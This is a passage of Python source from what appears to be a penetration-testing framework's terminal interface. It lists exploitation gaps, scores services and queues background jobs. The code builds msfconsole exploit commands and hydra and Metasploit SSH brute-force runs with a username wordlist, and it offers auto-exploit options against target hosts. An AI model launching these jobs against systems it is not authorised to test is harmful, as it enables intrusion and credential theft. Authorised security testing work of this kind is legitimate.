                    click.echo(
                        click.style(
                            "\n  No MSF module available for this exploit", fg="yellow"
                        )
                    )
                click.pause()

            elif choice == "c":
                if msf_module:
                    try:
                        import pyperclip

                        pyperclip.copy(msf_module)
                        click.echo(
                            click.style(f"\n  ✓ Copied: {msf_module}", fg="green")
                        )
                    except ImportError:
                        click.echo(click.style(f"\n  Module: {msf_module}", fg="cyan"))
                        click.echo(
                            click.style(
                                "  (pyperclip not installed for clipboard)",
                                fg="bright_black",
                            )
                        )
                else:
                    click.echo(click.style("\n  No MSF module to copy", fg="yellow"))
                click.pause()

        except (KeyboardInterrupt, EOFError):
            return


def _exploit_bulk_action_menu(
    engagement_id: int, host_ip: str, exploit_items: List[Dict], selected_ids: set
) -> str:
    """Show inline bulk action menu for selected exploits."""
    from rich.console import Console

    console = Console()

    selected = [e for e in exploit_items if e["id"] in selected_ids]

    if not selected:
        return "back"

    console.print()
    console.print(f"  [bold]Selected: {len(selected)} exploit(s)[/bold]")
    console.print("    \\[v] View details")
    console.print("    \\[e] Execute selected exploits")
    console.print("    \\[x] Export to file")
    console.print("    \\[c] Clear selection")
    console.print("    \\[q] Back")
    console.print()

    try:
        choice = (
            click.prompt("  Select option", default="q", show_default=False)
            .strip()
            .lower()
        )

        if choice == "v":
            # View details in dedicated view
            exp = selected[0]["raw"]
            _view_exploit_detail(engagement_id, host_ip, exp)
            return "continue"

        elif choice == "e":
            # Execute selected exploits
            from souleyez.engine.background import enqueue_job

            queued = 0
            for item in selected:
                exp = item["raw"]
                module = exp.get("msf_module")
                if module:
                    try:
                        # Build MSF command string for -x flag
                        port = exp.get("port", 445)
                        msf_commands = (
                            f"use {module}; set RHOSTS {host_ip}; set RPORT {port}; "
                        )

                        # Add credentials for login/bruteforce modules
                        module_name = module.split("/")[-1] if "/" in module else module
                        login_modules = [
                            "ssh_login",
                            "telnet_login",
                            "ftp_login",
                            "smb_login",
                            "mysql_login",
                            "postgres_login",
                            "vnc_login",
                            "http_login",
                        ]
                        enumuser_modules = ["ssh_enumusers", "smb_enumusers"]

                        if any(lm in module_name for lm in login_modules):
                            msf_commands += (
                                "set USER_FILE data/wordlists/soul_users.txt; "
                            )
                            msf_commands += "set USER_AS_PASS true; "
                            msf_commands += "set STOP_ON_SUCCESS false; "
                            msf_commands += "set VERBOSE true; "
                        elif any(em in module_name for em in enumuser_modules):
                            msf_commands += (
                                "set USER_FILE data/wordlists/soul_users.txt; "
                            )

                        # For exploits use 'exploit', for auxiliary use 'run'
                        if module.startswith("exploit/"):
                            msf_commands += "exploit"
                        else:
                            msf_commands += "run"

                        enqueue_job(
                            tool="msfconsole",
                            target=host_ip,
                            args=["-q", "-x", msf_commands],
                            label=f"MSF: {module}",
                            engagement_id=engagement_id,
                        )
                        queued += 1
                    except Exception:
                        pass
            click.echo(click.style(f"\n  ✓ Queued {queued} exploit job(s)", fg="green"))
            click.echo(
                click.style(
                    "    Jobs will run in background via the worker.", fg="bright_black"
                )
            )
            click.echo(
                click.style(
                    "    View progress: Main Menu → [j] Job Queue", fg="bright_black"
                )
            )
            click.pause()
            return "clear"

        elif choice == "x":
            # Export to CSV
            import os
            from datetime import datetime

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"exploits_{host_ip.replace('.', '_')}_{timestamp}.csv"
            filepath = os.path.join(os.getcwd(), filename)

            with open(filepath, "w") as f:
                f.write("Port,Service,Module,Severity\n")
                for item in selected:
                    exp = item["raw"]
                    port = exp.get("port", "")
                    service = exp.get("service", "")
                    module = (exp.get("msf_module") or exp.get("title", "")).replace(
                        ",", ";"
                    )
                    severity = exp.get("severity", "")
                    f.write(f"{port},{service},{module},{severity}\n")

            click.echo(click.style(f"\n  ✓ Exported to {filepath}", fg="green"))
            click.pause()
            return "continue"

        elif choice == "c":
            return "clear"

        elif choice == "q":
            return "back"

    except (KeyboardInterrupt, click.Abort):
        pass

    return "continue"


def _view_gaps_centric(engagement_id: int, analysis: Dict, engagement: Dict):
    """Switch to gap-centric view (the old view)."""
    from rich.console import Console

    from souleyez.ui.design_system import DesignSystem

    # State
    selected_gap_ids = set()
    gap_filter_severity = None
    gap_filter_host = None
    gap_page = 0
    gap_page_size = 15
    view_all_gaps = False
    show_detection_gaps = False  # Toggle for detection gaps section

    # Get detection summary for this engagement
    detection_summary = _get_detection_summary(engagement_id)

    while True:
        DesignSystem.clear_screen()
        console = Console()
        width = DesignSystem.get_terminal_width()

        # Header
        click.echo("\n┌" + "─" * (width - 2) + "┐")
        click.echo(
            "│"
            + click.style(
                " EXPLOITATION GAPS (Gap-Centric View) ".center(width - 2),
                bold=True,
                fg="yellow",
            )
            + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()

        # Build gaps
        all_gaps = build_exploitation_gaps(analysis["hosts"])

        # Apply filters
        filtered_gaps = all_gaps
        if gap_filter_severity:
            filtered_gaps = [
                g for g in filtered_gaps if g.get("severity") == gap_filter_severity
            ]
        if gap_filter_host:
            filtered_gaps = [
                g for g in filtered_gaps if g.get("host") == gap_filter_host
            ]

        # Display gaps table
        gap_page, total_gap_pages = display_exploitation_gaps_table(
            console,
            filtered_gaps,
            selected_gap_ids,
            gap_page,
            gap_page_size,
            view_all_gaps,
            gap_filter_severity,
            gap_filter_host,
            width,
        )

        # Detection Gaps Section (if Wazuh enabled)
        if (
            detection_summary.get("enabled")
            and detection_summary.get("not_detected", 0) > 0
        ):
            click.echo()
            click.echo("─" * width)
            det_gaps = detection_summary.get("gaps", [])
            det_count = detection_summary.get("not_detected", 0)
            det_pct = detection_summary.get("coverage_pct", 0)

            header = f"🛡️ DETECTION GAPS - {det_count} attack(s) NOT DETECTED by SIEM (Coverage: {det_pct}%)"
            click.echo(click.style(header, fg="red", bold=True))
            click.echo()

            if show_detection_gaps:
                # Show detailed detection gaps
                from rich.table import Table

                det_table = Table(
                    show_header=True, header_style="bold red", box=None, padding=(0, 1)
                )
                det_table.add_column("Attack", width=15)
                det_table.add_column("Target", width=18)
                det_table.add_column("Time", width=20)
                det_table.add_column("Command", no_wrap=False)

                for gap in det_gaps[:10]:  # Show top 10
                    attack_type = gap.get("attack_type", "unknown")
                    target_ip = gap.get("target_ip", "-")
                    attack_time = gap.get("attack_time", "-")
                    if attack_time and len(str(attack_time)) > 19:
                        attack_time = str(attack_time)[:19]
                    command = (gap.get("command") or "-")[:50]

                    det_table.add_row(
                        f"[red]{attack_type}[/red]",
                        target_ip,
                        str(attack_time),
                        f"[dim]{command}[/dim]",
                    )

                console.print("  ", det_table)

                if len(det_gaps) > 10:
                    click.echo(
                        click.style(
                            f"  ... and {len(det_gaps) - 10} more detection gaps",
                            fg="bright_black",
                        )
                    )
                click.echo()
            else:
                # Collapsed view - just show summary
                click.echo(f"  • {det_count} attacks went undetected by Wazuh SIEM")
                click.echo(
                    click.style("  Press [d] to view detection gap details", fg="cyan")
                )
                click.echo()

        # Menu
        click.echo("─" * width)
        click.echo()
        if selected_gap_ids:
            click.echo(
                click.style(
                    f"  Selected: {len(selected_gap_ids)} gap(s)", fg="cyan", bold=True
                )
            )
            click.echo()
        click.echo("  [#] View gap details")
        click.echo("  [t] Toggle - Toggle pagination")
        click.echo("  [f] Filter by severity")
        click.echo("  [h] Filter by host")
        if (
            detection_summary.get("enabled")
            and detection_summary.get("not_detected", 0) > 0
        ):
            click.echo("  [d] Toggle detection gaps view")
        if gap_filter_severity or gap_filter_host:
            click.echo("  [c] Clear filters")
        click.echo("  [q] Back to hosts view")

        try:
            choice = input("\n  Select option: ").strip().lower()

            if choice == "q":
                return
            elif choice == "i" and filtered_gaps:
                from souleyez.ui.interactive_selector import interactive_select

                gap_items = [
                    {
                        "id": g["id"],
                        "host_port": f"{g['host']}:{g['port']}",
                        "service": g["service"],
                        "priority": g["priority_score"],
                        "severity": g["severity"],
                        "reason": g["reason"][:40],
                    }
                    for g in filtered_gaps
                ]

                columns = [
                    {"name": "Host:Port", "width": 22, "key": "host_port"},
                    {"name": "Service", "width": 14, "key": "service"},
                    {"name": "Priority", "width": 10, "key": "priority"},
                    {"name": "Reason", "width": 40, "key": "reason"},
                ]

                interactive_select(
                    items=gap_items,
                    columns=columns,
                    selected_ids=selected_gap_ids,
                    get_id=lambda g: g["id"],
                    title="SELECT EXPLOITATION GAPS",
                )

                if selected_gap_ids:
                    result = gap_bulk_action_menu(
                        engagement_id, filtered_gaps, selected_gap_ids, analysis
                    )
                    if result == "clear":
                        selected_gap_ids.clear()
                continue
            elif choice == "t":
                view_all_gaps = not view_all_gaps
                if not view_all_gaps:
                    gap_page = 0
                continue
            elif choice == "n" and not view_all_gaps and gap_page < total_gap_pages - 1:
                gap_page += 1
                continue
            elif choice == "p" and not view_all_gaps and gap_page > 0:
                gap_page -= 1
                continue
            elif choice == "f":
                gap_filter_severity = select_severity_filter()
                gap_page = 0
                continue
            elif choice == "h":
                gap_filter_host = select_host_filter(analysis["hosts"])
                gap_page = 0
                continue
            elif choice == "c":
                gap_filter_severity = None
                gap_filter_host = None
                gap_page = 0
                continue
            elif choice == "d":
                # Toggle detection gaps view
                show_detection_gaps = not show_detection_gaps
                continue
            elif choice.isdigit():
                # View gap details by number
                gap_idx = int(choice) - 1
                if 0 <= gap_idx < len(filtered_gaps):
                    view_gap_details(filtered_gaps[gap_idx], engagement_id)
                else:
                    click.echo(click.style("  Invalid gap number", fg="red"))
                    click.pause()
            else:
                click.echo(click.style("Invalid option", fg="red"))
                click.pause()

        except (KeyboardInterrupt, EOFError):
            return


def display_overview(overview: Dict, width: int):
    """Display overview statistics."""
    click.echo("═" * width)
    click.echo(click.style("📊 OVERVIEW", bold=True, fg="cyan"))
    click.echo("─" * width)
    click.echo()

    click.echo(f"Total Hosts:        {overview['total_hosts']}")
    click.echo(f"Total Services:     {overview['total_services']}")

    exploited_pct = overview["exploitation_percentage"]
    color = "green" if exploited_pct > 50 else "yellow" if exploited_pct > 20 else "red"
    click.echo(
        f"Exploited:          {overview['exploited_services']} / {overview['total_services']} ",
        nl=False,
    )
    click.echo(click.style(f"({exploited_pct}%)", fg=color))

    click.echo(f"Credentials Found:  {overview['credentials_found']}")
    click.echo(f"Critical Findings:  {overview['critical_findings']}")
    click.echo()


def display_exploitation_summary(overview: Dict, width: int):
    """Display compact exploitation summary line."""
    total = overview.get("total_services", 0)
    exploited = overview.get("exploited_services", 0)
    # Calculate attempted and not_attempted from overview or defaults
    attempted = overview.get("attempted_services", 0)
    not_attempted = total - exploited - attempted

    click.echo(click.style("📊 EXPLOITATION SUMMARY", bold=True, fg="cyan"))
    summary_line = (
        f"  Total Services: {total}  │  "
        f"✅ Exploited: {click.style(str(exploited), fg='green')}  │  "
        f"🔄 Attempted: {click.style(str(attempted), fg='yellow')}  │  "
        f"⚠️  Not Attempted: {click.style(str(not_attempted), fg='red')}"
    )
    click.echo(summary_line)
    click.echo()


def build_exploitation_gaps(hosts: List[Dict]) -> List[Dict]:
    """Build a list of exploitation gaps from all hosts.

    Returns list of gap dicts with:
    - id: unique identifier
    - host: IP address
    - port: port number
    - service: service name
    - priority_score: 0-100 score
    - severity: critical/high/medium/low
    - reason: why it's a gap
    - suggestions: list of suggested actions
    """
    gaps = []
    gap_id = 0

    for host in hosts:
        host_ip = host.get("host", "unknown")
        host_score = host.get("score", 50)

        for service in host.get("services", []):
            status = service.get("status", "not_tried")

            # Only include gaps (not exploited services)
            if status == "exploited":
                continue

            gap_id += 1

            # Calculate priority score based on various factors
            base_score = host_score
            port = service.get("port", 0)
            svc_name = (service.get("service") or "unknown").lower()

            # Adjust score based on service type
            high_value_services = [
                "mysql",
                "mssql",
                "postgresql",
                "smb",
                "rdp",
                "ssh",
                "ftp",
                "telnet",
            ]
            if any(s in svc_name for s in high_value_services):
                base_score = min(100, base_score + 15)

            # Adjust for common exploitation ports
            high_value_ports = [21, 22, 23, 25, 445, 1433, 3306, 3389, 5432, 5900]
            if port in high_value_ports:
                base_score = min(100, base_score + 10)

            # Determine severity from score
            if base_score >= 80:
                severity = "critical"
            elif base_score >= 60:
                severity = "high"
            elif base_score >= 40:
                severity = "medium"
            else:
                severity = "low"

            # Determine reason
            if status == "not_tried":
                reason = "Not yet attempted"
            elif status == "attempted":
                reason = "Attempted - needs follow-up"
            else:
                reason = "Not yet attempted"

            # Build suggestions
            suggestions = []
            if "http" in svc_name:
                suggestions.append(
                    {"action": "Run directory enumeration", "tool": "gobuster"}
                )
                suggestions.append(
                    {"action": "Scan for web vulnerabilities", "tool": "nuclei"}
                )
            elif any(s in svc_name for s in ["mysql", "postgresql", "mssql"]):
                suggestions.append(
                    {"action": "Try default credentials", "tool": "hydra"}
                )
                suggestions.append(
                    {"action": "Search for SQL exploits", "tool": "searchsploit"}
                )
            elif "smb" in svc_name or "microsoft-ds" in svc_name:
                suggestions.append({"action": "Enumerate shares", "tool": "smbclient"})
                suggestions.append({"action": "Check for EternalBlue", "tool": "nmap"})
            elif "ssh" in svc_name:
                suggestions.append(
                    {"action": "Try credential brute-force", "tool": "msf_auxiliary"}
                )
            elif "ftp" in svc_name:
                suggestions.append({"action": "Check anonymous login", "tool": "ftp"})
                suggestions.append(
                    {"action": "Try credential brute-force", "tool": "hydra"}
                )
            else:
                suggestions.append(
                    {"action": f"Research {svc_name} exploits", "tool": "searchsploit"}
                )

            gaps.append(
                {
                    "id": gap_id,
                    "host": host_ip,
                    "port": port,
                    "service": svc_name,
                    "version": service.get("version", ""),
                    "priority_score": base_score,
                    "severity": severity,
                    "status": status,
                    "reason": reason,
                    "suggestions": suggestions,
                }
            )

    # Sort by priority score (highest first)
    gaps.sort(key=lambda g: -g["priority_score"])
    return gaps


def display_exploitation_gaps_table(
    console,
    gaps: List[Dict],
    selected_ids: set,
    page: int,
    page_size: int,
    view_all: bool,
    severity_filter,
    host_filter,
    width: int,
) -> tuple:
    """Display exploitation gaps in a Rich table with pagination and checkboxes.

    Returns: (current_page, total_pages)
    """
    from rich.table import Table

    from souleyez.ui.design_system import DesignSystem

    # Count by severity
    severity_counts = {
        "critical": sum(1 for g in gaps if g["severity"] == "critical"),
        "high": sum(1 for g in gaps if g["severity"] == "high"),
        "medium": sum(1 for g in gaps if g["severity"] == "medium"),
        "low": sum(1 for g in gaps if g["severity"] == "low"),
    }

    click.echo("═" * width)
    click.echo(
        click.style(
            f"⚠️  EXPLOITATION GAPS ({len(gaps)} total)", bold=True, fg="yellow"
        )
    )

    # Severity breakdown line
    sev_line = (
        f"  🔴 Critical: {severity_counts['critical']}  │  "
        f"🟠 High: {severity_counts['high']}  │  "
        f"🟡 Medium: {severity_counts['medium']}  │  "
        f"⚪ Low: {severity_counts['low']}"
    )
    click.echo(sev_line)

    # Show active filters
    if severity_filter or host_filter:
        filter_parts = []
        if severity_filter:
            filter_parts.append(f"Severity: {severity_filter}")
        if host_filter:
            filter_parts.append(f"Host: {host_filter}")
        click.echo(click.style(f"  🔍 Filters: {', '.join(filter_parts)}", fg="cyan"))

    click.echo("─" * width)
    click.echo()

    if not gaps:
        click.echo("  " + click.style("No exploitation gaps found!", fg="green"))
        click.echo("  All services have been successfully exploited.")
        click.echo()
        return 0, 1

    # Pagination
    total_pages = max(1, (len(gaps) + page_size - 1) // page_size)
    page = min(page, total_pages - 1)

    if view_all:
        page_gaps = gaps
    else:
        start_idx = page * page_size
        end_idx = min(start_idx + page_size, len(gaps))
        page_gaps = gaps[start_idx:end_idx]

    # Create Rich table
    table = Table(
        show_header=True,
        header_style="bold cyan",
        box=DesignSystem.TABLE_BOX,
        padding=(0, 1),
        expand=True,
    )

    table.add_column("○", width=3, justify="center")  # Checkbox
    table.add_column("#", width=4, justify="right")
    table.add_column("Host:Port", width=22)
    table.add_column("Service", width=14)
    table.add_column("Priority", width=10, justify="center")
    table.add_column("Reason", width=35)

    for idx, gap in enumerate(page_gaps):
        # Calculate display index
        if view_all:
            display_idx = idx + 1
        else:
            display_idx = (page * page_size) + idx + 1

        # Checkbox
        checkbox = "●" if gap["id"] in selected_ids else "○"

        # Host:Port
        host_port = f"{gap['host']}:{gap['port']}"

        # Priority with color
        score = gap["priority_score"]
        severity = gap["severity"]
        severity_colors = {
            "critical": "red",
            "high": "yellow",
            "medium": "white",
            "low": "dim",
        }
        color = severity_colors.get(severity, "white")
        priority_display = f"[{color}]{score}/100[/{color}]"

        # Reason (truncated)
        reason = gap["reason"][:34]

        table.add_row(
            checkbox,
            str(display_idx),
            host_port,
            gap["service"],
            priority_display,
            reason,
        )

    console.print("  ", table)

    # Pagination info
    if view_all:
        click.echo(f"\n  Showing all {len(gaps)} gaps")
    else:
        click.echo(f"\n  Page {page + 1}/{total_pages}")

    click.echo()
    click.echo("  💡 TIP: Press 'i' for interactive mode")
    if total_pages > 1 and not view_all:
        click.echo("  n/p: Next/Previous page")
    click.echo()

    return page, total_pages


def display_menu_updated(
    width: int,
    selected_ids: set,
    severity_filter,
    host_filter,
    view_all: bool,
    total_pages: int,
):
    """Display updated menu with gap-focused options."""
    click.echo("═" * width)
    click.echo(click.style("OPTIONS", bold=True, fg="yellow"))
    click.echo("─" * width)
    click.echo()

    # Selection info
    if selected_ids:
        click.echo(
            click.style(f"  Selected: {len(selected_ids)} gap(s)", fg="cyan", bold=True)
        )
        click.echo()

    # Gap-focused options
    click.echo("  [#] View gap details")
    if view_all:
        click.echo("  [t] Toggle - Show paginated view")
    else:
        click.echo("  [t] Toggle - Show all gaps without pagination")
    click.echo("  [f] Filter - By severity level")
    click.echo("  [h] Filter - By host")
    if severity_filter or host_filter:
        click.echo("  [c] Clear - Clear all filters")
    click.echo()

    # Original options
    click.echo("  [d] View Host Details - Select and view specific host")
    click.echo("  [s] Filter Services - Advanced service filtering")
    click.echo("  [x] Export Report - Generate attack surface report")
    click.echo("  [a] Auto-Exploit - Automatically exploit untried services")
    click.echo("  [r] Refresh - Reload analysis data")
    click.echo()
    click.echo("  [t] Show All Targets - Toggle target list expansion")
    click.echo("  [e] Show All Exploits - Toggle exploit suggestions expansion")
    click.echo("  [m] Show All Recommendations - Toggle recommendations expansion")
    click.echo()
    click.echo("═" * width)
    click.echo()
    click.echo("  [q] ← Back to Main Menu")


def gap_bulk_action_menu(
    engagement_id: int, gaps: List[Dict], selected_ids: set, analysis: Dict
) -> str:
    """Show inline bulk action menu for selected gaps."""
    from rich.console import Console

    console = Console()

    selected_gaps = [g for g in gaps if g["id"] in selected_ids]

    if not selected_gaps:
        return "continue"

    console.print()
    console.print(f"  [bold]Selected: {len(selected_gaps)} gap(s)[/bold]")
    console.print("    \\[v] View details")
    console.print("    \\[r] Run suggested exploits")
    console.print("    \\[e] Export to file")
    console.print("    \\[m] Mark as attempted")
    console.print("    \\[g] Mark as ignored")
    console.print("    \\[c] Clear selection")
    console.print("    \\[q] Back")
    console.print()

    try:
        choice = (
            click.prompt("  Select option", default="q", show_default=False)
            .strip()
            .lower()
        )

        if choice == "v":
            # View gap details
            gap = selected_gaps[0]  # Show first selected gap
            _view_gap_detail(engagement_id, gap, analysis)
            return "continue"

        elif choice == "r":
            # Queue suggested exploits
            from souleyez.engine.background import enqueue_job

            queued = 0
            for gap in selected_gaps:
                if gap.get("suggestions"):
                    suggestion = gap["suggestions"][0]
                    tool = suggestion.get("tool", "nmap")
                    try:
                        enqueue_job(
                            tool=tool,
                            target=gap["host"],
                            args=["-p", str(gap["port"])],
                            label=f"Gap exploit: {gap['service']}",
                            engagement_id=engagement_id,
                        )
                        queued += 1
                    except Exception:
                        pass
            click.echo(click.style(f"\n  ✓ Queued {queued} job(s)", fg="green"))
            click.pause()
            return "clear"

        elif choice == "e":
            # Export to CSV
            import os
            from datetime import datetime

            output_dir = os.path.expanduser("~/.souleyez/exports")
            os.makedirs(output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(output_dir, f"gaps_export_{timestamp}.csv")

            with open(filepath, "w") as f:
                f.write("Host,Port,Service,Priority,Severity,Reason\n")
                for gap in selected_gaps:
                    f.write(
                        f"{gap['host']},{gap['port']},{gap['service']},{gap['priority_score']},{gap['severity']},{gap['reason']}\n"
                    )

            click.echo(click.style(f"\n  ✓ Exported to {filepath}", fg="green"))
            click.pause()

        elif choice == "m":
            # Mark as attempted
            click.echo(
                click.style(
                    f"\n  ✓ Marked {len(selected_gaps)} gap(s) as attempted", fg="green"
                )
            )
            click.echo("  (Note: This is UI-only, no persistence yet)")
            click.pause()

        elif choice == "g":
            # Mark as ignored
            click.echo(
                click.style(
                    f"\n  ✓ Marked {len(selected_gaps)} gap(s) as ignored", fg="green"
                )
            )
            click.echo("  (Note: This is UI-only, no persistence yet)")
            click.pause()

        elif choice == "c":
            return "clear"

    except (KeyboardInterrupt, EOFError):
        pass

    return "continue"


def select_severity_filter() -> str:
    """Prompt user to select severity filter."""
    click.echo()
    click.echo(click.style("  Filter by Severity:", bold=True))
    click.echo("    [1] 🔴 Critical only")
    click.echo("    [2] 🟠 High only")
    click.echo("    [3] 🟡 Medium only")
    click.echo("    [4] ⚪ Low only")
    click.echo("    [q] Cancel")
    click.echo()

    try:
        choice = input("  Select option: ").strip().lower()
        if choice == "q":
            return None
        severity_map = {"1": "critical", "2": "high", "3": "medium", "4": "low"}
        return severity_map.get(choice)
    except (KeyboardInterrupt, EOFError):
        return None


def select_host_filter(hosts: List[Dict]) -> str:
    """Prompt user to select host filter."""
    click.echo()
    click.echo(click.style("  Filter by Host:", bold=True))

    for idx, host in enumerate(hosts[:10], 1):
        click.echo(f"    [{idx}] {host.get('host', 'unknown')}")
    if len(hosts) > 10:
        click.echo(f"    ... and {len(hosts) - 10} more")
    click.echo("    [q] Cancel")
    click.echo()

    try:
        choice = input("  Select option: ").strip().lower()
        if choice == "q":
            return None
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(hosts):
                return hosts[idx].get("host")
    except (KeyboardInterrupt, EOFError):
        pass
    return None


def view_gap_details(gap: Dict, engagement_id: int):
    """View detailed information for a single gap."""
    from souleyez.ui.design_system import DesignSystem

    DesignSystem.clear_screen()
    width = get_terminal_width()

    click.echo()
    click.echo("═" * width)
    click.echo(
        click.style(
            f"  GAP DETAILS - {gap['host']}:{gap['port']}", bold=True, fg="cyan"
        )
    )
    click.echo("═" * width)
    click.echo()

    click.echo(f"  Host:         {gap['host']}")
    click.echo(f"  Port:         {gap['port']}")
    click.echo(f"  Service:      {gap['service']}")
    if gap.get("version"):
        click.echo(f"  Version:      {gap['version']}")
    click.echo()

    # Priority with color
    severity_colors = {
        "critical": "red",
        "high": "yellow",
        "medium": "white",
        "low": "bright_black",
    }
    color = severity_colors.get(gap["severity"], "white")
    priority_text = f"{gap['priority_score']}/100"
    click.echo(
        f"  Priority:     {click.style(priority_text, fg=color)} ({gap['severity'].upper()})"
    )
    click.echo(f"  Status:       {gap['status'].replace('_', ' ').title()}")
    click.echo(f"  Reason:       {gap['reason']}")
    click.echo()

    # Suggestions
    if gap.get("suggestions"):
        click.echo(click.style("  💡 Suggested Actions:", bold=True))
        for idx, suggestion in enumerate(gap["suggestions"], 1):
            click.echo(f"    [{idx}] {suggestion['action']} ({suggestion['tool']})")
        click.echo()

        # Option to run suggestion
        click.echo("─" * width)
        click.echo("  [#] Run suggestion by number")
        click.echo("  [q] Back")
        click.echo()

        try:
            choice = input("  Select option: ").strip()
            if choice.isdigit() and int(choice) > 0:
                idx = int(choice) - 1
                if 0 <= idx < len(gap["suggestions"]):
                    suggestion = gap["suggestions"][idx]
                    from souleyez.engine.background import enqueue_job

                    tool = suggestion["tool"]
                    port = gap["port"]
                    service = gap.get("service", "unknown")

                    # Build proper args based on tool
                    if tool == "msf_auxiliary":
                        # Use MSF ssh_login with legacy algorithm support
                        args = [
                            "auxiliary/scanner/ssh/ssh_login",
                            f'RHOSTS={gap["host"]}',
                            f"RPORT={port}",
                            "USER_FILE=data/wordlists/soul_users.txt",
                            "BLANK_PASSWORDS=true",
                            "USER_AS_PASS=true",
                            "STOP_ON_SUCCESS=false",
                            "VERBOSE=true",
                            "SSH_CLIENT_KEX=diffie-hellman-group14-sha1,diffie-hellman-group1-sha1",
                        ]
                    elif tool == "hydra":
                        # Hydra needs service type and credentials
                        # Map service to hydra protocol
                        hydra_service = (
                            "ssh"
                            if "ssh" in service
                            else (
                                "ftp"
                                if "ftp" in service
                                else "telnet" if "telnet" in service else "ssh"
                            )
                        )
                        args = [
                            "-L",
                            "data/wordlists/soul_users.txt",
                            "-e",
                            "nsr",  # Try null, same as user, reverse
                            "-t",
                            "4",
                            "-s",
                            str(port),
                            hydra_service,
                        ]
                    elif tool == "nmap":
                        args = ["-p", str(port), "-sV", "--script=vuln"]
                    elif tool == "ftp":
                        # FTP check - target is host:port
                        args = []
                    else:
                        args = ["-p", str(port)]

                    try:
                        enqueue_job(
                            tool=tool,
                            target=gap["host"],
                            args=args,
                            label=f"Gap: {suggestion['action']}",
                            engagement_id=engagement_id,
                        )
                        click.echo(
                            click.style(
                                f"\n  ✓ Queued job: {suggestion['action']}", fg="green"
                            )
                        )
                    except Exception as e:
                        click.echo(click.style(f"\n  ✗ Failed to queue: {e}", fg="red"))
                    click.pause()
        except (KeyboardInterrupt, EOFError):
            pass
    else:
        click.pause("  Press any key to return...")


def display_top_targets(hosts: List[Dict], width: int, show_all: bool = False):
    """Display top targets by attack surface."""
    click.echo("═" * width)
    click.echo(click.style("🎯 TOP TARGETS (by attack surface)", bold=True, fg="cyan"))
    click.echo("─" * width)
    click.echo()

    if not hosts:
        click.echo("  " + click.style("No hosts found", fg="yellow"))
        return False

    # Show top 3 or all
    display_count = len(hosts) if show_all else min(3, len(hosts))
    has_more = len(hosts) > 3

    for idx, host in enumerate(hosts[:display_count], 1):
        # Host header - Color thresholds match help system documentation
        # 80-100: CRITICAL (red), 60-79: HIGH (yellow), 40-59: MEDIUM (white), 0-39: LOW (dim)
        score_color = (
            "red"
            if host["score"] >= 80
            else (
                "yellow"
                if host["score"] >= 60
                else "white" if host["score"] >= 40 else "white"
            )
        )
        click.echo(f"#{idx}  {click.style(host['host'], bold=True)} ", nl=False)
        if host.get("hostname"):
            click.echo(f"({host['hostname']}) ", nl=False)
        click.echo(f"[Score: {click.style(str(host['score']), fg=score_color)}]")

        # Stats
        num_services = len(host.get("services", []))
        click.echo(
            f"    ├─ {host['open_ports']} open ports | {num_services} services | ",
            nl=False,
        )
        click.echo(f"{host['findings']} findings ", nl=False)
        if host["critical_findings"] > 0:
            click.echo(click.style(f"({host['critical_findings']} critical)", fg="red"))
        else:
            click.echo()

        # Exploitation progress
        prog = host["exploitation_progress"]
        pct = round(
            (prog["exploited"] / prog["total"] * 100) if prog["total"] > 0 else 0, 0
        )
        prog_color = "green" if pct > 50 else "yellow" if pct > 20 else "red"
        click.echo(
            f"    ├─ Exploitation: {prog['exploited']}/{prog['total']} services ",
            nl=False,
        )
        click.echo(click.style(f"({int(pct)}%)", fg=prog_color))

        # Actions
        click.echo(f"    └─ ", nl=False)
        click.echo(click.style("[View Details]", fg="cyan"), nl=False)
        click.echo(" ", nl=False)
        click.echo(click.style("[Scan More]", fg="cyan"), nl=False)
        if prog["not_tried"] > 0:
            click.echo(" ", nl=False)
            click.echo(click.style("[Auto-Exploit]", fg="green"))
        else:
            click.echo()

        click.echo()

    # Show "show more" indicator
    if has_more and not show_all:
        remaining = len(hosts) - display_count
        click.echo(
            click.style(
                f"  ... and {remaining} more hosts (option [6] to show all)",
                fg="bright_black",
            )
        )
        click.echo()

    return has_more


def display_service_status(host: Dict, width: int, show_all: bool = False):
    """Display detailed service status for a host."""
    click.echo("═" * width)
    click.echo(
        click.style(f"🔓 EXPLOITATION STATUS - {host['host']}", bold=True, fg="cyan")
    )
    click.echo("─" * width)
    click.echo()

    # Table header
    click.echo(f"{'Port':<7} {'Service':<18} {'Version':<35} {'Status':<17} Actions")
    # Separator matches column widths: 7 + 18 + 35 + 17 + ~remaining for Actions
    click.echo("─" * 170)

    # Show services (10 or all)
    all_services = host.get("services", [])
    services_to_show = all_services if show_all else all_services[:10]

    if not services_to_show:
        click.echo("  " + click.style("No services found", fg="yellow"))
        click.echo()
        return False

    for service in services_to_show:
        port = str(service["port"]).ljust(7)
        svc = (service.get("service") or "unknown")[:17].ljust(18)

        # Clean version: remove "syn-ack ttl XX" prefix
        version = service["version"] or ""
        import re

        version = re.sub(r"^syn-ack ttl \d+\s*", "", version)
        ver = version[:34].ljust(35)

        # Status with emoji
        status = service.get("status", "unknown")
        if status == "exploited":
            status_display = "✅ EXPLOITED".ljust(17)
        elif status == "attempted":
            status_display = "🔄 ATTEMPTED".ljust(17)
        else:
            status_display = "⚠️  NOT TRIED".ljust(17)

        # Actions
        actions = (service.get("suggested_actions") or [])[:2]
        actions_str = " | ".join([f"[{a}]" for a in actions]) if actions else ""

        click.echo(f"{port} {svc} {ver} {status_display} {actions_str}")

    total_services = len(all_services)
    has_more = total_services > 10 and not show_all
    if has_more:
        click.echo(
            f"\n... and {total_services - 10} more services "
            + click.style("[Press 's' to show all]", fg="cyan")
        )

    click.echo()

    # Legend
    click.echo("Legend:")
    click.echo(
        "  "
        + click.style("✅ EXPLOITED", fg="green")
        + "   - Successfully exploited, session/creds obtained"
    )
    click.echo(
        "  "
        + click.style("🔄 ATTEMPTED", fg="yellow")
        + "   - Exploit tried but failed or no results yet"
    )
    click.echo(
        "  "
        + click.style("⚠️  NOT TRIED", fg="red")
        + "  - No exploitation attempts logged"
    )
    click.echo()

    return has_more


def display_exploit_suggestions(
    engagement_id: int, top_hosts: List[Dict], width: int, show_all: bool = False
):
    """Display exploit suggestions for top hosts."""
    from rich.console import Console

    from souleyez.intelligence.exploit_suggestions import ExploitSuggestionEngine

    console = Console()
